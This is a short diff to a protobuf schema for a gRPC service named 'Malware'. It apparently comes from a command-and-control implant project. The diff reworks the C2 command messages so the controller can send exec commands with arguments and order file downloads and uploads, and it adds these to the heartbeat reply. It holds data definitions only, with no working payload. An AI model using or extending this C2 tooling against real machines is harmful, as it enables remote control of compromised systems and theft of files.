@@ -8,15 +8,21 @@ service Malware {
 
 message ImplantReply {
     string module = 1;
-    repeated string args = 2;
+    bytes args = 2;
 }
 
-message ExecReply {
-    string reply = 1;
+message Exec {
+    string Exec = 1;
+    repeated string Args = 2;
 }
 
-message FileReply {
-    string file = 1;
+message GetFile {
+    string filename = 1;
+}
+
+message UploadFile {
+    string filename = 1;
+    bytes contents = 2;
 }
 
 // Implant -> C2
@@ -32,7 +38,8 @@ message CheckCmdRequest {
 message CheckCmdReply {
     oneof message {
         int64 heartbeat = 1;
-        ExecReply exec = 2;
-        FileReply file = 3;
+        Exec exec = 2;
+        GetFile getfile = 3;
+        UploadFile uploadfile = 4; 
     }
 }
